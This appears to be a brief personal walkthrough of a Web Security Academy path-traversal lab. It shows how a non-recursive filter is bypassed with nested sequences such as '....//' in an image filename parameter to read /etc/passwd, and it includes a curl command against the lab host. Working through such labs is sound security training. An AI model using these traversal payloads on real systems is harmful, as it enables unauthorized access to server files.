1) visit the homepage and visit a product
2) open the imaghe into another tab and change ?filename=111.jpg to ?filename=../../../etc/passwd
but it is blocked 

so we try 
?filename=/etc/passwd but nothing, so we try to see if the sanitization is done recursively 

?filename=....//....//....//....//....//....//etc/passwd

OR 

?filename=..././..././..././..././..././etc/passwd

THEY WORK, so we can access to the file 


3) browsers will not show the results because the image has an error but we can use curl
     curl https://0a930055048a789782dc015d00d90021.web-security-academy.net/image?filename=....//....//....//....//....//....//etc/passwd

4) in this way we can read the passwd file
